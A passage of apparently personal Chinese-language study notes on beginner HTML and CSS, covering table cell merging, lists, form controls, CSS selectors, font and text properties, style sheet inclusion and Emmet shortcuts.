class="hljs-selector-tag">table</span>&gt;内<br></code></pre></td></tr></table></figure><h4 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>合并单元格的方式：<br>跨行：rowspan = “合并单元格个数”<br>跨列：colspan = “合并单元格个数”<br>目标单元格：<br>跨行：写于最上侧单元格内。<br>跨列：在左侧单元格内。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">三部曲：<br>1.确定跨行还是跨列<br>2.找到目标单元格 <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;10&quot;</span>&gt;</span>woreds<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>3.删除多余格<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>1.无序列表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">语法：<br>&lt;<span class="hljs-selector-tag">ul</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span>&gt;<br>    ....<br>    &lt;/<span class="hljs-selector-tag">li</span>&gt;<br>&lt;/<span class="hljs-selector-tag">ul</span>&gt;<br>注意：<br><span class="hljs-selector-tag">ul</span>中，只能放<span class="hljs-selector-tag">li</span>标签<br><span class="hljs-selector-tag">li</span>中，可以放任何标签<br></code></pre></td></tr></table></figure><p>2.有序列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br>有序列表会自动加上1，2，3的样式，即有序。<br></code></pre></td></tr></table></figure><p>3.自定义列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用场景：<br>关注我们<br><br>新浪微博<br>官方微信<br>联系我们<br><br><br>这样的列表<br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>如填写注册信息<br>用于收集用户信息。<br>表单的组成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.表单域<br>2.表单元素<br>3.提示信息<br><br></code></pre></td></tr></table></figure><h4 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">表单域是一个包含表单元素的区域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>标签用于定义表单域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>会把它范围内的表单元素信息提交给服务器<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;url地址&quot;</span> <span class="hljs-attr">method</span> = <span class="hljs-string">&quot;提交方式&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;表单域名称&quot;</span>&gt;</span><br>....<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h4><p>1.input输入表单元素<br>2.select下拉表单元素<br>3.textarea文本域元素</p><p>input:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span>&gt;是单标签，用于收集用户信息。<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;属性值&quot;/&gt;<br>属性值有<br><span class="hljs-type">text</span>（文本）<br><br><br>&lt;form&gt;<br>    用户名：&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;text&quot;/&gt;<br>&lt;/form&gt;<br><br><span class="hljs-keyword">password</span>（密码）<br>输入的是星号，不会泄露<br><br><br>radio（单选）<br>性别：男&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt; 女&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt;<br><span class="hljs-keyword">input</span>内必须有<span class="hljs-type">name</span>元素，且相同，才能达到单选的目的<br><br><br>checkbox（多选）<br>爱好：吃饭&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox&quot;/&gt;  睡觉&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot; 打豆豆&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot;<br><br><br></code></pre></td></tr></table></figure><p>name属性：分别不同表单元素<br>value属性：给此元素一个默认值，如“请输入用户名”。单选框也应写value，用于向后台传递信息。即规定input元素值。<br><strong>以上两个元素，每个input都应该有！</strong><br><br><br>checked属性：当页面打开的时候，会默认选中该按钮（单选或复选）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>maxlength：规定输入最大长度</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span> maxlength <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><br><br>提交按钮submit<br>重置按钮reset</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span> value = <span class="hljs-string">&quot;免费注册&quot;</span>&gt;<br>可以用value值来替换“提交”<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;reset&quot;</span> value = <span class="hljs-string">&quot;重新填写&quot;</span>&gt;<br>还原为默认值<br></code></pre></td></tr></table></figure><p>普通按钮button<br>文件域file</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;button&quot;</span> value = <span class="hljs-string">&quot;获取验证码&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;file&quot;</span> &gt;<br><span class="hljs-keyword">file</span>加不了value。<br></code></pre></td></tr></table></figure><p>lable标签<br>lable用于绑定一个表单元素，当点击lable内的文本，浏览器会自动选择对应表单<br>语法:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> = <span class="hljs-string">&quot;sex&quot;</span>&gt;男&lt;/<span class="hljs-keyword">label</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;radio&quot;</span> name = <span class="hljs-string">&quot;sex&quot;</span> value = <span class="hljs-string">&quot;male&quot;</span> id = <span class="hljs-string">&quot;sex&quot;</span>/&gt;<br>核心：<br><span class="hljs-keyword">label</span>中的<span class="hljs-keyword">for</span>与表单元素中的id要相同。<br>不要写错<span class="hljs-keyword">label</span>！！！！<br></code></pre></td></tr></table></figure><p>select下拉表单元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">籍贯:<br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>o1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> = <span class="hljs-string">&quot;selected&quot;</span>&gt;</span>o2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>加selected会默认选中。<br></code></pre></td></tr></table></figure><p>textarea文本域表单元素：<br>如大量书写文字，个人简介120字。</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stan">&lt;textarea <span class="hljs-built_in">rows</span> = <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-built_in">cols</span> = <span class="hljs-string">&quot;20&quot;</span>&gt;<br>&lt;/textarea&gt;<br><span class="hljs-built_in">rows</span>与<span class="hljs-built_in">cols</span>基本上不使用，以后用css改<br></code></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>css是网页的美容师<br>html的局限性：只关注内容的语义，<strong>丑</strong></p><h4 id="css语法规范"><a href="#css语法规范" class="headerlink" title="css语法规范"></a>css语法规范</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>测试案例<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    you<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>于<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>标签内加入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css">标签，于style内，格式为</span><br><span class="language-css">目标 &#123;属性:属性值;&#125;记得分号结尾</span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span> : <span class="hljs-number">12px</span>;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>根据不同需求选出不同标签<br>基础选择器：</p><h5 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h5><p>以标签名作为选择器</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><p>可单独选择一个，或某几个标签。<br>先定义类，再将元素拉入类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.red</span> &#123;</span><br><span class="language-css"> <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span> = <span class="hljs-string">&quot;red&quot;</span>&gt;</span>红色<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>定义类：<code>.</code>+类名<br>调用类：标签内加入class = “类名”<br>长类名用<code>-</code>短横线链接<code>.star-st</code></p><h5 id="多类名"><a href="#多类名" class="headerlink" title="多类名"></a>多类名</h5><p>可以在class属性中写多个类名<br>必须用空格隔开！</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;div <span class="hljs-keyword">class</span> = &quot;<span class="hljs-symbol">red</span> <span class="hljs-symbol">green</span>&quot;&gt;&lt;/<span class="hljs-symbol">div</span>&gt;<br></code></pre></td></tr></table></figure><h5 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h5><p>html元素用id属性来调用，style中用#定义</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#pink &#123;</span><br>    color : pink;<br>&#125;<br>...<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;pink&quot;</span>&gt;michell&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>与类选择器的区别：<br><strong>只能被调用一次</strong>，被第一个调用者成功调用后，无法再次被调用。</p><h5 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器"></a>通配符选择器</h5><p>用<code>*</code>定义，它会选取页面中所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>通配符选择器不需要调用，自动给所有元素使用指定的样式。</p><h4 id="CSS字体"><a href="#CSS字体" class="headerlink" title="CSS字体"></a>CSS字体</h4><p>字体系列</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-family</span>:<span class="hljs-string">&quot;Microsoft YaHei&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>字体粗细</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-weight</span>: normal;<br>&#125;<br>有以下几个参数<br>bold：粗体 number ：<span class="hljs-number">700</span>；<br>bolder：更粗<br>lighter：细体<br>number：加数字，<span class="hljs-number">700</span>是加粗，<span class="hljs-number">400</span>是正常<br><span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;<br></code></pre></td></tr></table></figure><p>文字样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>&#123;<br>    <span class="hljs-attribute">font-style</span>: normal;<br>&#125;<br>italic:斜体<br></code></pre></td></tr></table></figure><p>字体复合属性</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hsp">body&#123;<br>    <span class="hljs-keyword">font</span>: <span class="hljs-keyword">font</span>-style <span class="hljs-keyword">font</span>-weight <span class="hljs-keyword">font</span>-size/<span class="hljs-keyword">line</span>-height <span class="hljs-keyword">font</span>-family<span class="hljs-comment">;</span><br>    <span class="hljs-keyword">font</span>: italic <span class="hljs-number">700</span> <span class="hljs-number">16</span>px/<span class="hljs-number">20</span>px(<span class="hljs-number">20</span>px可不写) <span class="hljs-string">&#x27;microsoft yahei&#x27;</span><span class="hljs-comment">;</span><br>    不能更改顺序<br>    只有size和family不能省略，其余部分省略则取默认值。<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="文本属性"><a href="#文本属性" class="headerlink" title="文本属性"></a>文本属性</h4><p><strong>文本颜色</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以是16进制如：<br>#ff0000；<br>或rgb(255,0,0)；</p><p><strong>文本对齐</strong><br>text-align用于设置元素内文本内容的水平对齐方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-align</span> : left(默认值);<br>&#125;<br><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(默认左对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(右对齐)</span></span><br><span class="hljs-function"><span class="hljs-title">center</span><span class="hljs-params">(居中对齐)</span></span><br></code></pre></td></tr></table></figure><p><strong>装饰文本</strong><br>text-decoration属性规定添加到文本的修饰。可以添加下划线，删除线，上划线。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-decoration</span>: underline;<br>&#125;<br><span class="hljs-attribute">none</span>默认<br>underline下划线<br>line-throught删除线<br>overline上划线<br></code></pre></td></tr></table></figure><p>取消链接的下划线：<br>a{<br>    text-decoration: none;<br>}<br><strong>文本缩进</strong><br>text-indent属性用于指定文本第一行的缩进。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">10px</span>;<br>&#125;<br>只缩进首行！<br></code></pre></td></tr></table></figure><p>或使用em：当前元素一个文字的大小</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">text-indent</span>: <span class="hljs-number">2em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>行间距</strong><br>line-height属性用于设置行间的距离。<br>行间距由文本高度，上间距，下间距三者构成。<br>改变的是上、下间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CSS的引入方式"><a href="#CSS的引入方式" class="headerlink" title="CSS的引入方式"></a>CSS的引入方式</h4><p>按照css书写位置不同，css可以分为三大类<br><strong>内部样式表</strong><br>全部写入style标签内部<br>理论上&lt;style&gt;可以放在任意处，但一般放在head内<br>是嵌入式引用。<br><strong>行内样式表</strong><br>简单的修改：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> style = <span class="hljs-string">&quot;color : pink;&quot;</span>&gt;...&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>单个的，简单的修改。<br><strong>外部样式表</strong><br>样式单独写在style文件内，再进行调用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">新建一个后缀名为.css的文件<br>在这个文件里面，直接写样式，不需要style标签<br>使用&lt;link&gt;标签引入到html文件里<br>&lt;link rel <span class="hljs-operator">=</span> <span class="hljs-string">&quot;stylesheet&quot;</span> href <span class="hljs-operator">=</span> <span class="hljs-string">&quot;style.css（css文件路径）&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h4><p>emmet语法使用缩写提高编写速度。<br>1.快速生成HTML结构语法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">div</span>+<span class="hljs-literal">tab</span><br><span class="hljs-keyword">div</span>*<span class="hljs-number">10</span>+<span class="hljs-literal">tab</span><br>ul&gt;li*<span class="hljs-number">3</span><br><span class="hljs-keyword">div</span>+p<br>p.one(类名) == &lt;p <span class="hljs-built_in">class</span> = <span class="hljs-string">&quot;one&quot;</span>&gt;&lt;/p&gt;<br>p<span class="hljs-comment">#one(类名) == &lt;p id = &quot;one&quot;&gt;&lt;/p&gt;</span><br>即.就是生成类为此类名的元素，<span class="hljs-comment">#同理</span><br>.demo$*<span class="hljs-number">5</span>会生成以demo1~demo5为类的<span class="hljs-number">5</span>个<span class="hljs-keyword">div</span><br><span class="hljs-keyword">div</span>&#123;测试&#125; == &lt;<span class="hljs-keyword">div</span>&gt;测试&lt;/<span class="hljs-keyword">div</span>&gt;<br>$是自增符号<br><span class="hljs-keyword">div</span>&#123;$&#125;*<span class="hljs-number">5</span> == &lt;<span class="hljs-keyword">div</span>&gt;<span class="hljs-number">1</span>~<span class="hljs-number">5</span>&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>2.emmet语法快速生成css样式</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tac</span> = text-align:center<span class="hljs-comment">;</span><br><span class="hljs-attr">w100</span> = weight: <span class="hljs-number">100</span>px<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3.快速格式化代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">vscode直接右键，选格式化文档，会自动对齐所有代码<br></code></pre></td></tr></table></figure><h4 id="css复合选择器"><a href="#css复合选择器" class="headerlink" title="css复合选择器"></a>css复合选择器</h4><p><strong>后代选择器（重要）</strong><br>后代选择器<br>例如：我想把ol内的li全部定一个样式，而ul中不变</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ol</span> <span class="hljs-selector-tag">li</span>&#123;<br>    <span class="hljs-attribute">color</span>:pink;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span> 元素<span class="hljs-number">2</span>&#123;<br>    <span class="hljs-attribute">color</span>: pink;<br>&#125;<br>元素<span class="hljs-number">2</span>是元素<span class="hljs-number">1</span>后代。<br><span class="hljs-number">1</span>，<span class="hljs-number">2</span>之间用空格隔开<br>可以套很多层，但后者必须是前一个的后代<br>可以是任意基础选择器的组合<br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">a</span>&#123;<br><span class="hljs-attribute">color</span>: yellow;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>子选择器</strong><br>子选择器只能选择某元素最近一级的子元素<br>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">元素<span class="hljs-number">1</span>&gt;元素<span class="hljs-number">2</span>&#123;<br><span class="hljs-attribute">color</span>: red;<br>&#125;<br>即只选择元素<span class="hljs-number">1</span>内离近的<span 